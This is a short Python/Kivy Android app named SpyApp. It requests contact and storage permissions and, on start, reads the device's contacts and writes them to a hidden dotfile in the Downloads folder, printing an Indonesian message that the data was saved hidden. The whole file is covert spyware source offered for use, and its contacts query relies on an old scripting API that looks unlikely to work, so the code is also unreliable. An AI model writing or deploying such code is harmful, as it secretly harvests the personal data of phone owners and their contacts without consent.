from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
import android
from android.permissions import request_permissions, Permission

class Main(BoxLayout):
    pass

class SpyApp(App):
    def build(self):
        request_permissions([Permission.READ_CONTACTS, Permission.READ_EXTERNAL_STORAGE])
        return Main()

    def on_start(self):
        droid = android.Android()
        contacts = droid.queryContent('content://contacts/people').result
        with open('/storage/emulated/0/Download/.spy_contacts.txt', 'w') as f:
            f.write(str(contacts))
        print("Data kontak disimpan tersembunyi.")

if __name__ == '__main__':
    SpyApp().run()
